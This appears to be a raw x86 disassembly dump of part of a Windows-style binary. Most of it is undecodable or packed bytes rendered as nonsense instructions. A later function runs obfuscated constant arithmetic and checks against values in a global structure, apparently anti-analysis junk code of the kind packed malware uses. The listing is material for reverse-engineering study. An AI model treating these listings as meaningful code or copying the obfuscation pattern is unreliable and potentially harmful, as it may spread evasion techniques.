  40e541:	jb     0x40e5b1
  40e543:	(bad)  [eax]
  40e545:	cli    
  40e546:	mov    ah,BYTE PTR [ebp+ecx*8-0x664141fa]
  40e54d:	ret    0xbebe
  40e550:	scas   eax,DWORD PTR es:[edi]
  40e551:	mov    dh,dh
  40e553:	xchg   ecx,eax
  40e554:	in     eax,0x5e
  40e556:	mov    edx,0xed4ef877
  40e55b:	xlat   BYTE PTR ds:[ebx]
  40e55c:	push   eax
  40e55d:	pop    es
  40e55e:	add    DWORD PTR [ebx+0x45b05bc6],ebx
  40e564:	out    0xf,eax
  40e566:	enter  0x2,0x25
  40e56a:	stos   DWORD PTR es:[edi],eax
  40e56b:	sub    eax,0x63847645
  40e570:	retf   0x2869
  40e573:	xor    dl,BYTE PTR [ebp-0x5bad9d4c]
  40e579:	xchg   edi,eax
  40e57a:	adc    edx,eax
  40e57c:	rcl    BYTE PTR [eax],cl
  40e57e:	sbb    bl,al
  40e580:	mov    al,ds:0x983ce862
  40e585:	mov    ecx,0x4ede9005
  40e58a:	pusha  
  40e58b:	add    al,0xc7
  40e58d:	or     eax,0x498af3bf
  40e592:	test   eax,0x754d3595
  40e597:	test   ah,0xfb
  40e59a:	in     al,0x49
  40e59c:	inc    edx
  40e59d:	lods   eax,DWORD PTR ds:[esi]
  40e59e:	sbb    ah,bh
  40e5a0:	mov    ah,0x4a
  40e5a2:	mov    edx,0x5520661d
  40e5a7:	sub    eax,0x8d3d89c4
  40e5ac:	cli    
  40e5ad:	ret    
  40e5ae:	pop    esp
  40e5af:	stos   BYTE PTR es:[edi],al
  40e5b0:	cmp    al,0x64
  40e5b2:	fcmovnu st,st(2)
  40e5b4:	icebp  
  40e5b5:	push   0x9b0569fc
  40e5ba:	ja     0x40e5b4
  40e5bc:	and    DWORD PTR [ecx+ebx*2-0x40],edi
  40e5c0:	lods   eax,DWORD PTR ds:[esi]
  40e5c1:	add    esp,ebx
  40e5c3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e5c4:	in     eax,0xeb
  40e5c6:	mov    ebp,0xe9010912
  40e5cb:	mov    edx,0x2c53e6f2
  40e5d0:	ror    BYTE PTR cs:[ecx],1
  40e5d3:	test   eax,eax
  40e5d5:	add    edi,DWORD PTR [ebx+0x9430549]
  40e5db:	cmp    DWORD PTR [esi+0xc],ebx
  40e5de:	sti    
  40e5df:	outs   dx,DWORD PTR ds:[esi]
  40e5e0:	lods   al,BYTE PTR ds:[esi]
  40e5e1:	pop    ebx
  40e5e2:	nop
  40e5e3:	xor    eax,0x25d84aa4
  40e5e8:	xor    DWORD PTR [edi],edi
  40e5ea:	pcmpgtd mm7,mm7
  40e5ed:	int3   
  40e5ee:	jb     0x40e57a
  40e5f0:	inc    ebp
  40e5f1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e5f2:	mov    dh,BYTE PTR [ecx]
  40e5f4:	or     BYTE PTR [ebp+0x7e],0x7d
  40e5f8:	out    0x25,eax
  40e5fa:	idiv   BYTE PTR [esi-0x28378a6c]
  40e600:	xor    DWORD PTR [edi],esp
  40e602:	xor    BYTE PTR [edx],bl
  40e604:	adc    eax,0xfc83c25e
  40e609:	dec    edx
  40e60a:	push   ebp
  40e60b:	dec    esi
  40e60c:	(bad)  
  40e60d:	icebp  
  40e60e:	pushf  
  40e60f:	push   edx
  40e610:	mov    edi,0x7f166af1
  40e615:	dec    ebp
  40e616:	in     eax,dx
  40e617:	shl    BYTE PTR [ebx-0x15],0xee
  40e61b:	fs (bad) 
  40e61d:	int3   
  40e61e:	cmp    dh,bl
  40e620:	xchg   ebx,eax
  40e621:	pop    edx
  40e622:	pop    ebx
  40e623:	pop    edi
  40e624:	adc    al,0x6e
  40e626:	out    0xa7,eax
  40e628:	or     eax,0xf2f8e07f
  40e62d:	cdq    
  40e62e:	or     BYTE PTR [edi+0x5],ah
  40e631:	cmp    al,0x6d
  40e633:	(bad)  
  40e634:	(bad)  
  40e635:	push   0xffffffe0
  40e637:	dec    esp
  40e638:	stc    
  40e639:	repnz mov edi,0xb502048d
  40e63f:	test   BYTE PTR [ecx],bl
  40e641:	jmp    0x7f06:0xea652d87
  40e648:	pop    ebx
  40e649:	pop    es
  40e64a:	(bad)  
  40e64b:	iret   
  40e64c:	call   0xf77:0x348996e6
  40e653:	pop    eax
  40e654:	pop    es
  40e655:	adc    ecx,DWORD PTR es:[edi+0x5d]
  40e659:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e65a:	ficomp DWORD PTR ds:0x83293382
  40e660:	rcl    ebx,0xdb
  40e663:	mov    eax,ds:0x177228b
  40e668:	ja     0x40e69d
  40e66a:	sub    eax,0x9d272c6
  40e66f:	xor    BYTE PTR [ebp+0x672eaded],cl
  40e675:	or     edx,DWORD PTR [esi-0x618f5d38]
  40e67b:	jl     0x40e675
  40e67d:	and    esp,DWORD PTR [esi]
  40e67f:	ds cs fwait
  40e682:	jp     0x40e6c4
  40e684:	xor    ebx,esi
  40e686:	das    
  40e687:	scas   eax,DWORD PTR es:[edi]
  40e688:	jg     0x40e699
  40e68a:	(bad)  
  40e68b:	in     eax,0x1e
  40e68d:	or     al,0x72
  40e68f:	or     DWORD PTR [edi-0x62f6141f],ebx
  40e695:	inc    esp
  40e696:	cmp    esi,DWORD PTR [ebx]
  40e698:	test   al,0x32
  40e69b:	push   ds
  40e69c:	mov    ?,WORD PTR [esi]
  40e69e:	sub    esp,ebx
  40e6a0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e6a1:	push   ecx
  40e6a2:	adc    BYTE PTR [eax-0x6a],dh
  40e6a5:	and    eax,0xbe2ac33c
  40e6aa:	sbb    al,0x4e
  40e6ac:	and    edx,DWORD PTR [ebp-0x69]
  40e6af:	and    dh,BYTE PTR [ebp+0x71]
  40e6b2:	lds    edx,FWORD PTR [esi-0x5b]
  40e6b5:	mov    dl,0x7
  40e6b7:	xchg   ebp,eax
  40e6b8:	add    BYTE PTR [edx+0x6d1cf26a],0x10
  40e6bf:	(bad)  
  40e6c0:	jbe    0x40e69f
  40e6c2:	jo     0x40e741
  40e6c4:	sbb    DWORD PTR [ebx+eiz*4],edi
  40e6c7:	bound  eax,QWORD PTR [eax-0x5fcbf2df]
  40e6cd:	mov    cl,BYTE PTR es:[esi-0x2660d0e4]
  40e6d4:	fiadd  WORD PTR [eax-0x3d]
  40e6d7:	or     ecx,eax
  40e6d9:	or     al,BYTE PTR [esi-0x173a269a]
  40e6df:	loop   0x40e702
  40e6e1:	dec    edx
  40e6e2:	xor    DWORD PTR [edi-0x6f],0x4c
  40e6e6:	fcom   QWORD PTR [edi+0x4e]
  40e6e9:	or     eax,0xfd23ded0
  40e6ee:	lock xor eax,0xab67cffc
  40e6f4:	iret   
  40e6f5:	out    dx,al
  40e6f6:	sti    
  40e6f7:	mov    dl,0x57
  40e6f9:	fst    st(0)
  40e6fb:	fld    QWORD PTR [esp+ebx*4]
  40e6fe:	mov    edx,es
  40e700:	mov    al,ah
  40e702:	mov    bl,0x40
  40e704:	xor    eax,0x92d57367
  40e709:	stos   BYTE PTR es:[edi],al
  40e70a:	lahf   
  40e70b:	mov    esp,DWORD PTR [esi+0x7bff54e5]
  40e711:	xor    eax,0x68f3995
  40e716:	stc    
  40e717:	adc    DWORD PTR [edi],ebx
  40e719:	jecxz  0x40e78f
  40e71b:	push   ds
  40e71c:	sub    BYTE PTR [edi+0x23af0228],ah
  40e722:	push   0x5ac59606
  40e727:	xlat   BYTE PTR ds:[ebx]
  40e728:	dec    esp
  40e729:	pushf  
  40e72a:	jl     0x40e707
  40e72c:	in     al,0x9f
  40e72e:	push   ebx
  40e72f:	imul   edi,edi,0xa2641184
  40e735:	or     al,0x54
  40e737:	mov    dh,0xa5
  40e739:	fnstsw WORD PTR [eax]
  40e73b:	pop    ecx
  40e73c:	stos   BYTE PTR es:[edi],al
  40e73d:	and    DWORD PTR [edx+0x5e7c74ee],edi
  40e743:	fcom   st(6)
  40e745:	into   
  40e746:	push   ds
  40e747:	dec    ebx
  40e748:	add    eax,0x11eba9b7
  40e74d:	rcr    DWORD PTR [ebp-0x1adef566],1
  40e753:	and    bl,BYTE PTR [ecx-0x7b]
  40e756:	jne    0x40e7d0
  40e758:	(bad)  
  40e759:	(bad)  
  40e75a:	icebp  
  40e75b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e75c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e75d:	std    
  40e75e:	mov    edi,0xf787d5e9
  40e763:	outs   dx,DWORD PTR ds:[esi]
  40e764:	xor    dh,BYTE PTR [esi]
  40e766:	dec    ecx
  40e767:	stc    
  40e768:	cwde   
  40e769:	and    DWORD PTR [ecx+eiz*1+0x48],ecx
  40e76d:	or     DWORD PTR [esi-0x13],esp
  40e770:	and    ecx,edx
  40e772:	jle    0x40e74d
  40e774:	(bad)  
  40e775:	sbb    eax,0xfa5a7358
  40e77a:	call   0x26cb5827
  40e77f:	sbb    BYTE PTR [ecx+0x5e],bl
  40e782:	outs   dx,DWORD PTR ds:[esi]
  40e783:	cwde   
  40e784:	stc    
  40e785:	jno    0x40e7a4
  40e787:	jecxz  0x40e7de
  40e789:	pusha  
  40e78a:	bnd js 0x40e744
  40e78d:	xchg   esp,eax
  40e78e:	test   BYTE PTR [ebx],ch
  40e790:	shl    BYTE PTR [edx],cl
  40e792:	popa   
  40e793:	cli    
  40e794:	std    
  40e795:	clc    
  40e796:	outs   dx,DWORD PTR ds:[esi]
  40e797:	ins    BYTE PTR es:[edi],dx
  40e798:	hlt    
  40e799:	scas   eax,DWORD PTR es:[edi]
  40e79a:	cmc    
  40e79b:	shl    eax,1
  40e79d:	jecxz  0x40e723
  40e79f:	adc    ebp,edx
  40e7a1:	pop    ebp
  40e7a2:	cmp    al,0x86
  40e7a4:	adc    dh,al
  40e7a6:	shl    ebx,cl
  40e7a8:	enter  0x942b,0xa2
  40e7ac:	(bad)  
  40e7ae:	les    edx,FWORD PTR [ebx+0x5d]
  40e7b1:	add    bl,bl
  40e7b3:	jae    0x40e748
  40e7b5:	push   es
  40e7b6:	mov    esp,0xe707ee81
  40e7bb:	xchg   edx,eax
  40e7bc:	xor    DWORD PTR [edi],0x25
  40e7bf:	pop    esi
  40e7c0:	xchg   ebx,eax
  40e7c1:	push   ecx
  40e7c2:	mov    eax,0x43d2
  40e7c7:	sub    eax,ecx
  40e7c9:	add    eax,DWORD PTR [ebp+0xc]
  40e7cc:	xor    edx,edx
  40e7ce:	add    eax,DWORD PTR [ebp-0x14]
  40e7d1:	mov    ecx,DWORD PTR [ebp-0xc]
  40e7d4:	div    ecx
  40e7d6:	mov    ecx,DWORD PTR [ebp+0x10]
  40e7d9:	xor    edx,edx
  40e7db:	pop    edi
  40e7dc:	pop    ebx
  40e7dd:	or     eax,0x67ad
  40e7e2:	mov    DWORD PTR [esi+eax*4-0x3bfa4],ecx
  40e7e9:	mov    DWORD PTR [ebp+0x10],0x517b
  40e7f0:	mov    DWORD PTR [ebp+0xc],0x5d62
  40e7f7:	mov    DWORD PTR [ebp+0x8],0x41b0
  40e7fe:	mov    ecx,DWORD PTR [ebp+0x8]
  40e801:	mov    eax,DWORD PTR [ebp+0xc]
  40e804:	and    ecx,0x68c1
  40e80a:	sub    ecx,0x6fd3
  40e810:	or     ecx,eax
  40e812:	mov    eax,DWORD PTR [ebp+0x10]
  40e815:	imul   ecx,eax
  40e818:	mov    eax,0xf52840d5
  40e81d:	div    ecx
  40e81f:	leave  
  40e820:	ret    0xc
  40e823:	push   ebp
  40e824:	mov    ebp,esp
  40e826:	sub    esp,0xc0
  40e82c:	push   esi
  40e82d:	mov    DWORD PTR [ebp-0x80],0x2f93
  40e834:	mov    DWORD PTR [ebp-0x7c],0x3321
  40e83b:	mov    DWORD PTR [ebp-0x70],0x7d00
  40e842:	mov    DWORD PTR [ebp-0x6c],0xd87
  40e849:	jmp    0x40eb8c
  40e84e:	xor    dl,BYTE PTR [ecx]
  40e850:	sub    al,0x76
  40e852:	sub    al,0x78
  40e854:	mov    ah,0x99
  40e856:	sahf   
  40e857:	mov    ?,WORD PTR [eax+0x461e6cf]
  40e85d:	(bad)  [edx+0x1bebe0a]
  40e863:	les    edi,FWORD PTR [esi-0x2c934942]
  40e869:	mov    WORD PTR [ebx*1-0xe48c7ca],cs
  40e870:	fst    QWORD PTR [edi-0x3b72b55d]
  40e877:	aam    0x7b
  40e879:	cmp    DWORD PTR [ecx],esp
  40e87b:	jne    0x40e88f
  40e87d:	or     BYTE PTR [ebp-0x53],bl
  40e880:	mov    BYTE PTR [ebx+0x5e],al
  40e883:	gs add al,0x8
  40e886:	add    edi,esi
  40e888:	inc    ecx
  40e889:	loopne 0x40e851
  40e88b:	xchg   edx,eax
  40e88c:	adc    ch,BYTE PTR [edi-0x5df3baab]
  40e892:	or     DWORD PTR [edx-0x46],ecx
  40e895:	push   0x74d4b1c3
  40e89a:	out    0xef,al
  40e89c:	sbb    al,cl
  40e89e:	jns    0x40e8aa
  40e8a0:	pop    ss
  40e8a1:	ficomp DWORD PTR [eax]
  40e8a3:	call   0x9afc:0xbd35e9ea
  40e8aa:	inc    esp
  40e8ab:	cmp    DWORD PTR [edi+ebp*2+0x32],0x5e
  40e8b0:	out    dx,eax
  40e8b1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e8b2:	and    dl,ah
  40e8b4:	xchg   ebx,eax
  40e8b5:	outs   dx,BYTE PTR ds:[esi]
  40e8b6:	retf   0x338d
  40e8b9:	xchg   ebx,eax
  40e8ba:	pop    edx
  40e8bb:	ror    DWORD PTR [ecx],cl
  40e8bd:	inc    ebp
  40e8be:	or     eax,eax
  40e8c0:	(bad)  
  40e8c1:	adc    DWORD PTR [ebx+0x740d233d],esi
  40e8c7:	mov    fs,WORD PTR [ecx+0x7d3ebcd6]
  40e8cd:	daa    
  40e8ce:	adc    eax,0x99991f8b
  40e8d3:	scas   al,BYTE PTR es:[edi]
  40e8d4:	mov    dh,0x15
  40e8d6:	sete   BYTE PTR [edi+0x8fdde16]
  40e8dd:	xor    BYTE PTR [bx+si+0x1068],dl
  40e8e2:	(bad)  
  40e8e3:	(bad)  
  40e8e4:	ins    BYTE PTR es:[edi],dx
  40e8e5:	add    bh,bl
  40e8e7:	mov    cl,0x44
  40e8e9:	dec    eax
  40e8ea:	dec    esp
  40e8eb:	stos   BYTE PTR es:[edi],al
  40e8ec:	sti    
  40e8ed:	inc    ebp
  40e8ee:	mov    dh,0x98
  40e8f0:	gs pop ebx
  40e8f2:	repz sub DWORD PTR [ecx+0x3c67f527],ebx
  40e8f9:	mov    ebx,0xe004015e
  40e8fe:	icebp  
  40e8ff:	in     al,dx
  40e900:	das    
  40e901:	or     dl,BYTE PTR [ebp-0x6e01bc29]
  40e907:	jb     0x40e8da
  40e909:	dec    esi
  40e90a:	push   ebx
  40e90b:	stos   BYTE PTR es:[edi],al
  40e90c:	xchg   DWORD PTR [ebx-0x5],ebp
  40e90f:	mov    bl,0x80
  40e911:	scas   al,BYTE PTR es:[edi]
  40e912:	xchg   BYTE PTR [esi+0x11],ah
  40e915:	fld    QWORD PTR [ebx-0x29]
  40e918:	mov    DWORD PTR [edx+0x43],esp
  40e91b:	mov    dl,0x41
  40e91d:	sub    al,0xad
  40e91f:	jp     0x40e930
  40e921:	in     eax,dx
  40e922:	outs   dx,BYTE PTR ds:[esi]
  40e923:	jmp    0xa6fc:0x1729adb6
  40e92a:	out    dx,al
  40e92b:	add    DWORD PTR [esi-0xbd3f7fb],edx
  40e931:	sub    edx,edi
  40e933:	bound  esp,QWORD PTR [edx-0x2d]
  40e936:	jg     0x40e8e8
  40e938:	dec    esi
  40e939:	cmp    al,0x64
  40e93b:	adc    DWORD PTR [eax+0x47588185],esp
  40e941:	mov    BYTE PTR [esi+0x1e9884c5],0x7
  40e948:	inc    eax
  40e949:	add    dh,BYTE PTR [esi-0x40]
  40e94c:	(bad)  [eax-0x4f]
  40e94f:	cld    
  40e950:	cmp    al,0x76
  40e952:	jmp    0xb972:0xc885b9aa
  40e959:	(bad)  ds:0x2beb6535
  40e95f:	sub    ecx,DWORD PTR [edi-0x54]
  40e962:	sub    ecx,0xffffffea
  40e965:	push   esi
  40e966:	inc    edx
  40e967:	add    dl,BYTE PTR [eax-0x323b3194]
  40e96d:	sahf   
  40e96e:	lea    edi,[esi+0x8]
  40e971:	jne    0x40e954
  40e973:	not    cl
  40e975:	sub    eax,edx
  40e977:	loope  0x40e9b3
  40e979:	cmp    ah,BYTE PTR [ebp+0xe5dfcb9]
  40e97f:	test   DWORD PTR [eax+0x162dbf04],esi
  40e985:	test   BYTE PTR [esp+edi*1-0x47],ch
  40e989:	xor    ebp,ecx
  40e98b:	call   0xf7b6:0x40feae8d
  40e992:	and    DWORD PTR [eax+0x6e],0x12
  40e996:	aaa    
  40e997:	or     al,BYTE PTR [ebp-0x3f]
  40e99a:	sbb    DWORD PTR [ebx-0x224a4c67],ebx
  40e9a0:	mov    edi,fs
  40e9a2:	call   0x346a:0xa280f3f7
  40e9a9:	jecxz  0x40e9a2
  40e9ab:	aas    
  40e9ac:	dec    edx
  40e9ad:	adc    al,0x0
  40e9af:	sbb    DWORD PTR [ebp+0x786d7678],0x26
  40e9b6:	repz cmp edi,ebx
  40e9b9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e9ba:	xchg   ebp,eax
  40e9bb:	mov    ?,eax
  40e9bd:	inc    BYTE PTR [esi-0x55]
  40e9c0:	bound  esi,QWORD PTR ds:0x834e990d
  40e9c6:	mov    bh,BYTE PTR [edx-0x6a]
  40e9c9:	mov    esp,0xb095bec6
  40e9ce:	mov    dl,0x17
  40e9d0:	rcr    eax,1
  40e9d2:	mov    ah,0xdd
  40e9d4:	outs   dx,BYTE PTR ds:[esi]
  40e9d5:	dec    ecx
  40e9d6:	repnz mov eax,ds:0x6e407c27
  40e9dc:	aam    0x9d
  40e9de:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e9df:	ja     0x40e9d1
  40e9e1:	cwde   
  40e9e2:	out    dx,eax
  40e9e3:	sbb    DWORD PTR gs:[edx+0x38],edi
  40e9e7:	(bad)  
  40e9e8:	pop    esi
  40e9e9:	adc    cl,bl
  40e9eb:	int    0xf6
  40e9ed:	jno    0x40ea40
  40e9ef:	sub    ch,cl
  40e9f1:	xor    eax,0x7a4cf1db
  40e9f6:	jmp    0x40ea04
  40e9f8:	fdivr  QWORD PTR [eax+0x2b]
  40e9fb:	out    0x82,eax
  40e9fd:	in     eax,0x37
  40e9ff:	xchg   esp,eax
  40ea00:	rcl    DWORD PTR [edi+0x58447d17],1
  40ea06:	test   edx,edx
  40ea08:	xor    esi,DWORD PTR [eax-0x5a0b8f8]
  40ea0e:	jnp    0x40e9ac
  40ea10:	leave  
  40ea11:	mov    eax,ds:0x28cf328b
  40ea16:	pop    esi
  40ea17:	out    0x8a,eax
  40ea19:	jl     0x40e9be
  40ea1b:	mov    edi,0x17125560
  40ea20:	test   BYTE PTR [esi+0x683f526],dh
  40ea26:	(bad)  
  40ea27:	in     al,0xf7
  40ea29:	sbb    eax,0x3b0dd8d5
  40ea2e:	mov    dl,0x96
  40ea30:	mov    dh,0x7d
  40ea32:	sbb    al,BYTE PTR [ebx]
  40ea34:	adc    ebp,ebx
  40ea36:	mov    bh,0xf0
  40ea38:	out    0xe1,al
  40ea3a:	push   ss
  40ea3b:	sti    
  40ea3c:	aam    0xcd
  40ea3e:	enter  0x7518,0x14
  40ea42:	js     0x40ea72
  40ea44:	mov    edi,0x4d0a0ae5
  40ea49:	pop    ebp
  40ea4a:	xor    DWORD PTR [eax+0x64db69af],eax
  40ea50:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ea51:	add    BYTE PTR [ebp+edi*1+0x73d06f2e],0x78
  40ea59:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  40ea5b:	js     0x40ea31
  40ea5d:	scas   eax,DWORD PTR es:[edi]
  40ea5e:	call   0x926a:0xb2fdeef7
  40ea65:	adc    eax,0x2501f4c8
  40ea6a:	ffreep st(0)
  40ea6c:	mov    edi,0x4ef008d4
  40ea71:	nop
  40ea72:	push   ebp
  40ea73:	ins    BYTE PTR es:[edi],dx
  40ea74:	stos   BYTE PTR es:[edi],al
  40ea75:	sub    eax,0x50d23687
  40ea7a:	xor    al,0xc3
  40ea7c:	cmp    BYTE PTR [edi],al
  40ea7e:	cmp    al,0x4d
  40ea80:	mov    ch,0x4f
  40ea82:	mov    ecx,0xe99284dc
  40ea87:	sub    bl,bl
  40ea89:	(bad)  
  40ea8a:	(bad)  
  40ea8b:	xchg   ebx,eax
  40ea8c:	push   edi
  40ea8d:	outs   dx,BYTE PTR ds:[esi]
  40ea8e:	stos   BYTE PTR es:[edi],al
  40ea8f:	push   cs
  40ea90:	shl    DWORD PTR [ecx-0x60280d86],0x4b
  40ea97:	pop    ebp
  40ea98:	push   cs
  40ea99:	xchg   ecx,eax
  40ea9a:	jnp    0x40eb13
  40ea9c:	mov    ebp,0x9ea82cd1
  40eaa1:	into   
  40eaa2:	data16 ror BYTE PTR [eax-0x3895eedc],cl
  40eaa9:	xchg   DWORD PTR [ecx],ebp
  40eaab:	push   ds
  40eaac:	dec    eax
  40eaad:	mov    dl,0xab
  40eaaf:	and    DWORD PTR [ebp-0x80],edi
  40eab2:	cwde   
  40eab3:	lea    ebp,[eax-0x6ce7409]
  40eab9:	adc    ch,dl
  40eabb:	and    BYTE PTR [ecx],cl
  40eabd:	inc    ebx
  40eabe:	lock (bad) 
  40eac0:	adc    edx,esi
  40eac2:	jp     0x40eaa6
  40eac4:	(bad)
  40eac7:	pop    ecx
  40eac8:	and    DWORD PTR [esp+ecx*1],edi
  40eacb:	test   al,0x8f
  40eacd:	outs   dx,DWORD PTR ds:[esi]
  40eace:	arpl   sp,bp
  40ead0:	popf   
  40ead1:	inc    eax
  40ead2:	inc    edi
  40ead3:	(bad)  [ecx+eiz*4-0x55ccf816]
  40eada:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40eadc:	sub    esi,DWORD PTR [ecx-0x4e]
  40eadf:	les    ecx,FWORD PTR [ebx+esi*2-0x447e53a]
  40eae6:	mov    esi,0x7355cea6
  40eaeb:	add    al,0x98
  40eaed:	rcr    BYTE PTR [ebx+0x294b294],0x72
  40eaf4:	mov    ebp,edi
  40eaf6:	mov    dh,0x75
  40eaf8:	and    BYTE PTR [ebx],cl
  40eafa:	(bad)  
  40eafb:	in     al,dx
  40eafc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40eafd:	xchg   ebp,eax
  40eafe:	pop    ss
  40eaff:	jp     0x40eb29
  40eb01:	jb     0x40eb24
  40eb03:	xchg   ebx,eax
  40eb04:	stos   DWORD PTR es:[edi],eax
  40eb05:	sar    DWORD PTR [edx],0x8a
  40eb08:	push   ebp
  40eb09:	repz in eax,0x5a
  40eb0c:	jbe    0x40eacc
  40eb0e:	jmp    0x3980:0xfce2bf76
  40eb15:	dec    esi
  40eb16:	add    ah,BYTE PTR [ebp-0x6a7d86ed]
  40eb1c:	fdivr  st(2),st
  40eb1e:	push   0x46dfeeab
  40eb23:	sbb    BYTE PTR gs:[esi],0x66
  40eb27:	loope  0x40eb04
  40eb29:	sub    ebp,ebx
  40eb2b:	xor    eax,0x1ae2fbf2
  40eb30:	dec    ebp
  40eb31:	test   DWORD PTR ds:0xde2c4f93,ebx
  40eb37:	shl    BYTE PTR [edi-0x1c392673],cl
  40eb3d:	add    DWORD PTR [edi+esi*4-0x39d83e],edx
  40eb44:	ins    BYTE PTR es:[edi],dx
  40eb45:	mov    ch,0xef
  40eb47:	scas   al,BYTE PTR es:[edi]
  40eb48:	mov    al,BYTE PTR [ecx]
  40eb4a:	mov    ds:0xef94e892,eax
  40eb4f:	sub    dh,al
  40eb51:	and    al,0x98
  40eb53:	sbb    eax,0xffc502a1
  40eb58:	or     cl,cl
  40eb5a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40eb5b:	fxch   st(5)
  40eb5d:	adc    ebp,esp
  40eb5f:	xchg   ebp,eax
  40eb60:	fwait
  40eb61:	gs sub eax,0xb0df72a
  40eb67:	push   eax
  40eb68:	aad    0x17
  40eb6a:	nop
  40eb6b:	add    ebp,DWORD PTR [edi]
  40eb6d:	sbb    BYTE PTR [ecx+0x46],0x71
  40eb71:	pop    ebp
  40eb72:	adc    ch,ah
  40eb74:	hlt    
  40eb75:	lahf   
  40eb76:	push   ds
  40eb77:	push   ebp
  40eb78:	and    BYTE PTR [edi-0x51],dl
  40eb7b:	mov    edx,0x1a24ed52
  40eb80:	mov    ah,0x47
  40eb82:	dec    ebp
  40eb83:	scas   al,BYTE PTR es:[edi]
  40eb84:	js     0x40ebcc
  40eb86:	mul    DWORD PTR [edx-0x39]
  40eb89:	ins    DWORD PTR es:[edi],dx
  40eb8a:	sub    cl,BYTE PTR [esi-0x39]
  40eb8d:	inc    ebp
  40eb8e:	mov    al,ds:0x4197
  40eb93:	mov    DWORD PTR [ebp-0x5c],0xa7d
  40eb9a:	mov    DWORD PTR [ebp-0x50],0x772d
  40eba1:	mov    DWORD PTR [ebp-0x4c],0x37d8
  40eba8:	mov    DWORD PTR [ebp-0x40],0x414a
  40ebaf:	mov    DWORD PTR [ebp-0x3c],0x55ef
  40ebb6:	mov    DWORD PTR [ebp-0x30],0x136b
  40ebbd:	mov    DWORD PTR [ebp-0x2c],0x53e4
  40ebc4:	mov    DWORD PTR [ebp-0x20],0x32d8
  40ebcb:	mov    DWORD PTR [ebp-0x1c],0x5cb6
  40ebd2:	mov    DWORD PTR [ebp-0xc],0x3956
  40ebd9:	mov    DWORD PTR [ebp-0xa4],0x4e57
  40ebe3:	mov    DWORD PTR [ebp-0x94],0x1
  40ebed:	mov    DWORD PTR [ebp-0x14],0x17ab
  40ebf4:	mov    DWORD PTR [ebp-0x64],0x7a3d
  40ebfb:	mov    DWORD PTR [ebp-0x54],0x378a
  40ec02:	mov    DWORD PTR [ebp-0x74],0x5a00
  40ec09:	mov    DWORD PTR [ebp-0x24],0x1f3a
  40ec10:	mov    DWORD PTR [ebp-0x84],0x9a225
  40ec1a:	mov    DWORD PTR [ebp-0x44],0x31f8
  40ec21:	mov    DWORD PTR [ebp-0x34],0x3663
  40ec28:	mov    DWORD PTR [ebp-0xb4],0x3165
  40ec32:	mov    DWORD PTR [ebp-0xc0],0x1ebe
  40ec3c:	mov    DWORD PTR [ebp-0xbc],0x43cc
  40ec46:	mov    DWORD PTR [ebp-0xb0],0x7564
  40ec50:	mov    DWORD PTR [ebp-0xac],0x18cf
  40ec5a:	mov    DWORD PTR [ebp-0xa0],0x3135
  40ec64:	mov    DWORD PTR [ebp-0x9c],0x568d
  40ec6e:	mov    DWORD PTR [ebp-0x90],0x11f2
  40ec78:	mov    DWORD PTR [ebp-0x8c],0x63ea
  40ec82:	mov    DWORD PTR [ebp-0x10],0x3066
  40ec89:	mov    DWORD PTR [ebp-0x8],0x6ed2
  40ec90:	push   0x7e1d
  40ec95:	mov    DWORD PTR [ebp-0x4],0x30f4
  40ec9c:	mov    eax,DWORD PTR [ebp-0x20]
  40ec9f:	mov    ecx,DWORD PTR [ebp-0x1c]
  40eca2:	push   0x5380
  40eca7:	push   ecx
  40eca8:	push   eax
  40eca9:	call   0x41594e
  40ecae:	mov    ecx,eax
  40ecb0:	mov    eax,DWORD PTR [ebp-0x30]
  40ecb3:	xor    ecx,eax
  40ecb5:	mov    esi,edx
  40ecb7:	mov    edx,DWORD PTR [ebp-0x2c]
  40ecba:	mov    eax,DWORD PTR [ebp-0x40]
  40ecbd:	xor    esi,edx
  40ecbf:	mov    edx,DWORD PTR [ebp-0x3c]
  40ecc2:	xor    ecx,0xf3a
  40ecc8:	or     ecx,eax
  40ecca:	mov    eax,ds:0x4226f8
  40eccf:	mov    eax,DWORD PTR [eax+0x1d8]
  40ecd5:	mov    eax,DWORD PTR [eax]
  40ecd7:	xor    esi,0x6665
  40ecdd:	or     esi,edx
  40ecdf:	add    ecx,0xef6a96a5
  40ece5:	cdq    
  40ece6:	adc    esi,0xc8b6a000
  40ecec:	cmp    eax,ecx
  40ecee:	jne    0x40ecfc
  40ecf4:	cmp    edx,esi
  40ecf6:	je     0x40ed5b
  40ecfc:	mov    eax,DWORD PTR [ebp-0x50]
  40ecff:	mov    ecx,DWORD PTR [ebp-0x4c]
  40ed02:	mov    edx,DWORD PTR [ebp-0x60]
  40ed05:	mov    esi,DWORD PTR [ebp-0x5c]
  40ed08:	add    eax,0x7818
  40ed0d:	adc    ecx,0x87
  40ed13:	or     eax,edx
  40ed15:	mov    edx,DWORD PTR [ebp-0x70]
  40ed18:	or     ecx,esi
  40ed1a:	mov    esi,DWORD PTR [ebp-0x6c]
  40ed1d:	push   esi
  40ed1e:	push   edx
  40ed1f:	push   ecx
  40ed20:	push   eax
  40ed21:	call   0x41594e
  40ed26:	mov    ecx,DWORD PTR [ebp-0x80]
  40ed29:	mov    esi,DWORD PTR [ebp-0x7c]
  40ed2c:	and    eax,ecx
  40ed2e:	mov    ecx,DWORD PTR ds:0x4226f8
  40ed34:	mov    ecx,DWORD PTR [ecx+0x1d0]
  40ed3a:	mov    ecx,DWORD PTR [ecx]
  40ed3c:	and    edx,esi
  40ed3e:	xor    eax,0x2b01
  40ed43:	xor    edx,0x2021
  40ed49:	xor    esi,esi
  40ed4b:	cmp    ecx,eax
  40ed4d:	jne    0x40f1dc
  40ed53:	cmp    esi,edx
  40ed55:	jne    0x40f1dc
  40ed5b:	mov    eax,DWORD PTR [ebp-0xa4]
